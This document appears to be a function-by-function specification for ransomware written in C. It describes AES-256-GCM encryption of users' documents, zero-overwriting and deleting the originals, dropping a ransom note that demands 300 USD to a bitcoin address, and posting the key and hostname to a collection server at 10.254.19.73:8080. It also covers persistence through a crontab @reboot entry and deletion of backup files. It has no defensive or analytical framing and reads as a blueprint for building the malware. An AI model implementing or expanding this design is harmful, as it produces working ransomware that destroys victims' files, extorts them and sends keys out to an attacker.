descricao: Generates 32 random bytes via RAND_bytes() as AES-256 session key, Base64-encodes the key using EVP_EncodeBlock(), writes JSON object {"aes_key":"<base64>"} to /tmp/.master.key with file permission 0600 via fopen/fwrite/chmod.

Recursively enumerates files using opendir/readdir in directories ~/Documentos_Teste, ~/Documentos, ~/Downloads, ~/Imagens, and /mnt, filtering by extensions .xlsx, .docx, .pdf, .txt, .csv, .jpg, .png, .db, .backup, .psd, .zip, .rar. Returns a dynamically allocated array of absolute file paths.

For each file path in an input list, reads file content, generates a 12-byte nonce via RAND_bytes(), encrypts using AES-256-GCM via EVP_CIPHER_CTX (key passed as const uint8_t*), produces ciphertext and 16-byte GCM tag. Writes a new file with original path appended with ".PROCESSED" containing [12-byte nonce][ciphertext][16-byte GCM tag]. Overwrites original file with zeros via fwrite then removes it with remove(). Returns nothing.

For each directory in a provided list, creates a file named "#_STATUS_NOTICE_#.txt" containing text demanding 300 USD to payment address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa and instructing contact via a secure channel. Uses fopen/fprintf/fclose. Returns nothing.

Reads /tmp/.master.key via fopen/fread, parses JSON using strstr(buf, "\"aes_key\":\"") to locate field, advances pointer by 11 bytes, extracts Base64 key to closing quote via strchr, validates length >0. Obtains system hostname via gethostname(). Constructs JSON {"aes_key":"...","hostname":"..."} and sends HTTP POST to http://10.254.19.73:8080/collect via libcurl with Content-Type: application/json. If HTTP response status is 200, removes /tmp/.master.key with remove().

Reads current user crontab via popen("crontab -l", "r"), checks for line exactly matching "@reboot <current_program_absolute_path>". If absent, adds that line via popen("crontab -", "w") after writing existing lines. Returns nothing.

Recursively scans directories ~/Documentos_Teste, ~/Documentos, ~/Downloads, ~/Imagens, and /mnt using opendir/readdir, identifies files with extensions .bak, .backup, .old, and deletes each using remove(). Returns nothing.
